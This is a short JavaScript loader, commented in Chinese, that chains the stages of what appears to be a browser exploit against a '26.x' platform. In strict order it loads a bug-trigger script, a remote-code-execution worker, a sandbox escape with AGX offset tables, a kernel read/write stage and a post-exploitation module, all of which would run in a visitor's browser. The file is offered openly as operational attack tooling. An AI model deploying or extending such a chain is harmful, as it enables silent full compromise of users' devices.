// 26.x 链完整依赖加载器（严格顺序）
(function(){
  const BASE = location.origin;
  function load(src){ var s=document.createElement("script"); s.src=BASE+src; s.async=false; document.head.appendChild(s); }
  // ① 触发
  load("/stage1_bug303879_inbounds_26.5.js");
  // ② RCE
  load("/rce_worker_26.5.js");
  // ③ 沙箱（偏移表前置）
  load("/sbx0_26x_agx_offsets.js");
  load("/sbx0_26.js");
  // ④ 内核 R/W
  load("/sbx1_26.js");
  // ⑤ 后渗透
  load("/pe_main_26.js");
})();
